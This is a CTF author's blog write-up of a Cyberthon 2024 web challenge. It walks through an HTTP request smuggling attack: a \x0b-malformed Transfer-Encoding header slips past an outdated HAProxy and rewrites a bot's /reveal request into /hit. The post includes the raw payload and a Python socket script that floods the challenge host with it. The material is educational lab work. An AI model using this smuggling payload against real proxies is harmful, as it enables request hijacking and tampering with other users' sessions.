<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Cyberthon 2024 - The Galaxy's Best Smuggler | Iscara</title><meta name="author" content="Iscara"><meta name="copyright" content="Iscara"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Cyberthon is an annual CTF competition targeted towards JC students in Singapore. This year, I had the opportunity to author a challenge for the web category: The Galaxy’s Best Smuggler. At the end of">
<meta property="og:type" content="article">
<meta property="og:title" content="Cyberthon 2024 - The Galaxy&#39;s Best Smuggler">
<meta property="og:url" content="http://iscaraca.github.io/2024/05/04/cyberthon-2024/index.html">
<meta property="og:site_name" content="Iscara">
<meta property="og:description" content="Cyberthon is an annual CTF competition targeted towards JC students in Singapore. This year, I had the opportunity to author a challenge for the web category: The Galaxy’s Best Smuggler. At the end of">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://iscaraca.github.io/img/avatar-icon.png">
<meta property="article:published_time" content="2024-05-03T16:00:00.000Z">
<meta property="article:modified_time" content="2025-05-31T08:45:05.813Z">
<meta property="article:author" content="Iscara">
<meta property="article:tag" content="Challenge Creation">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://iscaraca.github.io/img/avatar-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Cyberthon 2024 - The Galaxy's Best Smuggler",
  "url": "http://iscaraca.github.io/2024/05/04/cyberthon-2024/",
  "image": "http://iscaraca.github.io/img/avatar-icon.png",
  "datePublished": "2024-05-03T16:00:00.000Z",
  "dateModified": "2025-05-31T08:45:05.813Z",
  "author": [
    {
      "@type": "Person",
      "name": "Iscara",
      "url": "http://iscaraca.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://iscaraca.github.io/2024/05/04/cyberthon-2024/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Cyberthon 2024 - The Galaxy\'s Best Smuggler',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/cobaltcore-bg.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cobaltcore.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Iscara</span></a><a class="nav-page-title" href="/"><span class="site-name">Cyberthon 2024 - The Galaxy's Best Smuggler</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Cyberthon 2024 - The Galaxy's Best Smuggler</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-05-03T16:00:00.000Z" title="Created 2024-05-04 00:00:00">2024-05-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-31T08:45:05.813Z" title="Updated 2025-05-31 16:45:05">2025-05-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Writeups/">CTF Writeups</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Cyberthon is an annual CTF competition targeted towards JC students in Singapore. This year, I had the opportunity to author a challenge for the web category: The Galaxy’s Best Smuggler.</p>
<p>At the end of this writeup are my thoughts on challenge creation.</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote>
<p>📘 Challenge description:</p>
<p>“Ever heard of sabacc?”</p>
<p>“I’ve played it a couple times.”</p>
<p>You eye the stifling pile of credit on Lando’s side of the table, allowing yourself a wry smile.</p>
<p>“Having a good day, I reckon.”</p>
<p>“Oh, you ain’t seen nothing yet, Han. I bet my ship I win this next game.”</p>
<p>You spy a faint glimmer in his eyes typical of all smugglers, one of trickery and deceit.</p>
<p>“Not playing fair, I suppose. Well, two can play at that game. After all…”</p>
<p>“They don’t call me the galaxy’s best SMUGGLER for nothing.” </p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Iscaraca/CTF-Challenges/tree/main/cyberthon2024/the_galaxys_best_smuggler">Link to source code</a></p>
<p>In this challenge, you play against a bot in a modified version of blackjack, where the sweet spot is 20. Your opponent has rigged the cards such that they’ll always draw 20 at the start every time, while you’ll draw a measly 2. To get the flag, you’ll have to win the game.</p>
<p><img src="/2024/05/04/cyberthon-2024/sabacc.png" alt="Sabacc game page"></p>
<p>The rules of the game are simple.</p>
<ul>
<li><p>Your opponent will make the first move.</p>
</li>
<li><p>At every turn, you can make one of 3 moves:</p>
<ul>
<li>Hit: Draw a new card from the deck, and add it to your hand.</li>
<li>Stand: End your turn without taking a card.</li>
<li>Reveal: Place your hand on the table face up, and force your opponent to do the same. The winner will be judged. You cannot do this on the move that opens the game.</li>
</ul>
</li>
</ul>
<p>While the entire solve path was clued via hints given in the provided markdown file during the challenge, I’ll go through the challenge as if there was no help given.</p>
<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="Crafting-a-plan"><a href="#Crafting-a-plan" class="headerlink" title="Crafting a plan"></a>Crafting a plan</h3><p>Source code for this challenge is provided in full, along with deployment steps. Let’s first look at the conditions required to win a game.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Check for winning hand</span></span><br><span class="line"><span class="keyword">if</span> (player_1_total == <span class="number">20</span> <span class="keyword">and</span> player_2_total == <span class="number">20</span>):</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Draw&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_1_total == <span class="number">20</span>:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 1&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_2_total == <span class="number">20</span>:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for overflowed hands</span></span><br><span class="line"><span class="keyword">elif</span> (player_1_total &gt; <span class="number">20</span> <span class="keyword">and</span> player_2_total &gt; <span class="number">20</span>):</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Draw&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_1_total &gt; <span class="number">20</span>:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 2&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_2_total &gt; <span class="number">20</span>:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for larger hand</span></span><br><span class="line"><span class="keyword">elif</span> player_1_total == player_2_total:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Draw&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_1_total &gt; player_2_total:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 1&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_2_total &gt; player_1_total:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 2&quot;</span></span><br></pre></td></tr></table></figure>


<p>The bot will always join as player 1, so its hand will be evaluated first. We have no opportunity to win using our hand alone, so we’ll need to somehow sabotage our opponent’s hand to win. If we could force the bot to draw another card instead of revealing its hand, we’d overflow its hand and win by default. Is there a way to do just that?</p>
<p>This challenge is an introduction to <strong>HTTP request smuggling</strong>, as clued by the title and the description. This is a technique to interfere with the way servers process HTTP requests coming from more than one source. Before we get into specifics, it would be useful to read up on an <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">overview of how the attack works</a>.</p>
<p>We’ll be using this technique to tamper with the bot’s HTTP request to <code>/reveal</code>, and change it to <code>/hit</code> instead.</p>
<h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>We’ll need to craft a HTTP request that can be parsed using the <code>Content-Length</code> header on either the proxy or the game server, and <code>Transfer-Encoding</code> on the other. However, both HAProxy (the proxy) and Gunicorn (the backend web server) ignore the <code>Content-Length</code> header when both of them are present, as per the HTTP&#x2F;1 specification.</p>
<p>Either by looking for vulnerabilities related to HAProxy or noticing that the specific version of HAProxy used in the docker environment is outdated, we can find a <a target="_blank" rel="noopener" href="https://nathandavison.com/blog/haproxy-http-request-smuggling">well-documented vulnerability</a> detailing a way to malform the <code>Transfer-Encoding</code> header such that HAProxy fails to detect it, while Gunicorn does. The key is to simply insert a <code>\x0b</code> character into the <code>Transfer-Encoding</code> header.</p>
<p>With this knowledge, we can craft a HTTP request to tamper with the bot’s.</p>
<h3 id="How-the-HTTP-Protocol-Works"><a href="#How-the-HTTP-Protocol-Works" class="headerlink" title="How the HTTP Protocol Works"></a>How the HTTP Protocol Works</h3><p>Before we get to our payload, let’s first go through how web applications send and receive data.</p>
<p>Almost all HTTP communication is done over TCP&#x2F;IP, which you can think of as a reliable pipe that streams bytes of data from one end to another. Bytes that go in one end of the pipe come out of the other correctly, and in the same order they went in. When HTTP messages are transmitted over this pipe in a single stream of bytes, how does the web application receiving this data know when each request starts and stops?</p>
<p>First, the application will read the stream of bytes until it receives two CRLF sequences, <code>\r\n\r\n</code>. This will be the end of our HTTP header. Notice how in the example request below, the header and body are delimited with a double CRLF.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 23</span><br><span class="line"></span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure>


<p>However, the body does not have a fixed delimiter indicating its end. Instead, the length of the body can be determined from the header, either via <code>Content-Length</code> or <code>Transfer-Encoding: chunked</code>. How the second method works can be found <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding">here</a>. Once the length of the body is determined, the application will then read that number of bytes from the pipe, successfully reading one full HTTP request.</p>
<p>While the application is parsing the header, where is the HTTP body stored? All data that has not been procedded by the application yet is stored in a buffer called the TCP Receive Window, until the application chooses to read more data from the pipe. Remember that data being read from the pipe must be in the same order it went in.</p>
<h3 id="Constructing-our-Payload"><a href="#Constructing-our-Payload" class="headerlink" title="Constructing our Payload"></a>Constructing our Payload</h3><p>I will be using <a target="_blank" rel="noopener" href="https://github.com/siemens/edgeshark">edgeshark</a> to capture network traffic from within the docker environment, which will allow us to view the transfer of HTTP packets using Wireshark. This is not a necessary step, but it’s useful for a writeup&#x2F;tutorial such as this one.</p>
<p>In this section, it is important that <strong>all requests are sent to the proxy directly</strong>. Sending these requests to your client will do nothing as the bot’s requests do not pass through the client.</p>
<p>We’ll be monitoring HAProxy’s ethernet interface for this section. On round 3, the bot will send a GET request to the <code>/reveal</code> endpoint with its cookie.</p>
<p><img src="/2024/05/04/cyberthon-2024/reveal.png" alt="Reveal request"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /reveal HTTP/1.1</span><br><span class="line">Host: proxy:1080</span><br><span class="line">User-Agent: python-requests/2.31.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Cookie: player_id=9576b07a-88b5-4df0-94a0-39ded4ee47d2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Now that we know the bot’s HTTP request, let’s break down the attack. Consider this payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /game-state HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8001</span><br><span class="line">Content-Length: 30</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Transfer-Encoding:[\x0b]chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /hit HTTP/1.1</span><br><span class="line">X-Foo:</span><br></pre></td></tr></table></figure>


<p>When we send this to HAProxy, it ignores the <code>Transfer-Encoding</code> header and uses the value provided by <code>Content-Length</code> to parse the request. This makes the proxy interpret the request as is, up to <code>X-Foo:</code>. However, the proxy forwards this request as a stream of bytes to the backend server, which correctly indentifies <code>Transfer-Encoding</code> and reads the stream as such:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /game-state HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8001</span><br><span class="line">Content-Length: 30</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Transfer-Encoding:[\x0b]chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>


<p>This leaves the remainder of the request,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /hit HTTP/1.1</span><br><span class="line">X-Foo:</span><br></pre></td></tr></table></figure>

<p>still in the TCP Receive Window of the game server. What happens if the bot sends its request now? What would the stream of data look like in the TCP pipe?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /hit HTTP/1.1</span><br><span class="line">X-Foo:GET /reveal HTTP/1.1</span><br><span class="line">Host: proxy:1080</span><br><span class="line">User-Agent: python-requests/2.31.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Cookie: player_id=9576b07a-88b5-4df0-94a0-39ded4ee47d2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>When the server is ready to process its next request, it reads the above as one full HTTP request, a GET request to <code>/hit</code> from the bot’s player ID. We’ve successfully tampered with the bot’s request!</p>
<h3 id="One-Possible-Pitfall"><a href="#One-Possible-Pitfall" class="headerlink" title="One Possible Pitfall"></a>One Possible Pitfall</h3><p>Just sending this payload once will not work. Looking at the edgeshark capture, we can see that our TCP stream is closing right after we send our payload, and the GET request to <code>/reveal</code> doesn’t use the same stream. </p>
<p><img src="/2024/05/04/cyberthon-2024/stream.png" alt="Stream capture"></p>
<p>The issue is that Gunicorn spawns multiple threads per worker, so smuggling one of them won’t be enough. The simple workaround here is to send our payload to the proxy many times to ensure that all the TCP streams get polluted with our payload.</p>
<h3 id="Final-Solution"><a href="#Final-Solution" class="headerlink" title="Final Solution"></a>Final Solution</h3><p>All we have to do is wait until its our move, either hit or stand, and run our solve script right before the bot sends in the request to reveal.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># The proxy port is 4941</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;GET /game-state HTTP/1.1\r\nHost: sabacc.chals.f.cyberthon24.ctf.sg:4941\r\nContent-Length: 30\r\nConnection: keep-alive\r\nTransfer-Encoding:&lt;insert-malbyte-here&gt;chunked\r\n\r\n0\r\n\r\nGET /hit HTTP/1.1\r\nX-Foo:&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((<span class="string">&quot;sabacc.chals.f.cyberthon24.ctf.sg&quot;</span>, <span class="number">4941</span>))</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line">response = sock.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="built_in">print</span>(response.decode())</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\user\sol&gt; python .\solution.py</span><br><span class="line">HTTP/1.1 406 NOT ACCEPTABLE</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Sat, 04 May 2024 12:06:26 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;:&quot;Player ID not set&quot;&#125;</span><br></pre></td></tr></table></figure>


<p><img src="/2024/05/04/cyberthon-2024/forced.png" alt="Forced draw"></p>
<p>And all we have to do now is reveal.</p>
<p><img src="/2024/05/04/cyberthon-2024/win.png" alt="Win"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberthon&#123;the_falcon_is_all_mine!&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Thoughts"><a href="#Thoughts" class="headerlink" title="Thoughts"></a>Thoughts</h2><p>When I was given the theme for this year’s Cyberthon (Star Wars), the idea to somehow incorporate request smuggling as a thematic connection to the smugglers and gunrunners of the SW universe came to me pretty quickly. The whole card game idea came from the lore, and I think I did a pretty good job on that part.</p>
<p>Halfway through making the challenge, I realised that the vulnerability worked against me, as teams could very easily sabotage others by smuggling their requests to the server as well. I had to come up with a solution for this, which was my standalone CTF challenge instancer you can find <a target="_blank" rel="noopener" href="https://github.com/Iscaraca/CTFInstancer">here</a>.</p>
<p>I really wanted to make this a good learning experience, which was why I put almost the entire solution path in a downloadable markdown file as hints. It was a bit challenging to balance exploration with supervision in a way that made the challenge rewarding, but this challenge wasn’t supposed to be that hard anyway. The CTF was 8 hours, after all.</p>
<p>I think this challenge seemed way too daunting to most participants, despite being (in my opinion) the easiest challenge out of the three harder web challenges. Perhaps I should’ve left out the fact that this challenge was difficult in the markdown file to harmlessly mislead them.</p>
<p>Thank you to Alt-Tab Labs and CSIT for this opportunity, and to Kane from NUSH for solving my challenge. You can claim caifan from me anytime.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://Iscaraca.github.io">Iscara</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://iscaraca.github.io/2024/05/04/cyberthon-2024/">http://iscaraca.github.io/2024/05/04/cyberthon-2024/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Challenge-Creation/">Challenge Creation</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/04/21/greyctf-2024/" title="GreyCTF 2024 Writeups"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">GreyCTF 2024 Writeups</div></div><div class="info-2"><div class="info-item-1">I participated under team youtiaos and we ended 1st place local.  I was solving in the web and misc categories. The specific challenges I solved are in the image below.  I’ll update this writeup with the flags once the challenges are back up. Web ChallengesBaby WebThe website uses Flask session cookies but the secret key is given unchanged in the source code. Sign another cookie with is_admin=True and proceed to spend 10 minutes finding for a hidden element on the admin page to get the flag....</div></div></div></a><a class="pagination-related" href="/2024/10/16/tisc-2024/" title="TISC 2024 - Baby Flagchecker"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">TISC 2024 - Baby Flagchecker</div></div><div class="info-2"><div class="info-item-1">TISC is a two-week online sequential style CTF competition hosted by CSIT, where participants solve a series of 12 challenges. Over 1300 participants took on the challenges, with the top three levels of challenges having a cash prize pool of $10,000 each to be shared between participants who’ve successfully cleared the respective levels. I was given the opportunity to create the challenge at level 7, a Web3 reverse engineering&#x2F;binary exploitation challenge. I’ll be sharing the writeup,...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2023/10/21/tisc-2023/" title="TISC 2023 - Blind SQL Injection"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-21</div><div class="info-item-2">TISC 2023 - Blind SQL Injection</div></div><div class="info-2"><div class="info-item-1">TISC is a two-week online sequential style CTF competition hosted by CSIT, where participants solve a series of 10 challenges. Over 1000 participants took on the challenges, with the top three levels of challenges having a cash prize pool of $10,000 each to be shared between participants who successfully cleared the respective levels. I was given the opportunity to create the challenge at level 8, and I’ll be sharing the writeup as well as a few of my thoughts at the end of the blog...</div></div></div></a><a class="pagination-related" href="/2024/10/16/tisc-2024/" title="TISC 2024 - Baby Flagchecker"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-16</div><div class="info-item-2">TISC 2024 - Baby Flagchecker</div></div><div class="info-2"><div class="info-item-1">TISC is a two-week online sequential style CTF competition hosted by CSIT, where participants solve a series of 12 challenges. Over 1300 participants took on the challenges, with the top three levels of challenges having a cash prize pool of $10,000 each to be shared between participants who’ve successfully cleared the respective levels. I was given the opportunity to create the challenge at level 7, a Web3 reverse engineering&#x2F;binary exploitation challenge. I’ll be sharing the writeup,...</div></div></div></a><a class="pagination-related" href="/2023/08/01/cyberthon-2023/" title="Cyberthon 2023 - Astockalypse (Author Writeup + Notes)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-01</div><div class="info-item-2">Cyberthon 2023 - Astockalypse (Author Writeup + Notes)</div></div><div class="info-2"><div class="info-item-1">Cyberthon is an annual CTF competition targeted towards JC students in Singapore, jointly organised by HCI, 